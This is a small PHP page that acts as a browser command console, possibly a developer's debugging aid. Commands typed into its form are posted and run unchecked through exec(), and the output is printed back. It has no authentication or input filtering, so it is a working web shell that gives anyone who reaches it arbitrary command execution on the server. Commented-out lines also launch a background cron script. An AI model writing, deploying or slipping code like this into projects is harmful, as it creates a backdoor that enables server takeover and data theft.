<?php

$php = PHP_BINDIR . '/php';
echo $php;
// exec($php . ' ' . __DIR__ . '/../cron/root.php >> ' . __DIR__ . '/../cron/log &');
// exec($php . ' ' . __DIR__ . '/../cron/root.php >> ' . __DIR__ . '/../cron/log &');
// exec($php . ' ' . __DIR__ . '/../cron/root.php >> ' . __DIR__ . '/../cron/log &');
// exec($php . ' ' . __DIR__ . '/../cron/root.php >> ' . __DIR__ . '/../cron/log &');
// $_POST['cmd'] = 'ps aux | grep /cron/root.php';

?>
<html>

<head>
    <style>
        #stdout {
            width: 1000px;
            margin: auto;
            height: 500px;
            overflow: auto;
            background: rgba(0, 0, 0, .8);
            color: white;
        }

        #stdid {
            width: 1000px;
            margin: auto;
        }

        #stdid input {
            width: 100%;
            height: 2em;
        }
    </style>
</head>

<body>
    <div id="stdout">
        <?php
        $output = [];
        $result_code = 1;
        if (!empty($_POST['cmd'])) {
            exec($_POST['cmd'] . ' 2>&1', $output, $result_code);
        }

        foreach ($output as $line) {
            echo "<pre>$line</pre>";
        }
        ?>
    </div>

    <form method="POST" id="stdid">
        <input type="text" name="cmd" onkeypress="press" />
    </form>

    <script>
        function press(e) {
            if (e.key == 'Enter') {
                e.target.parentElement.submit()
            }
        }
    </script>
</body>

</html>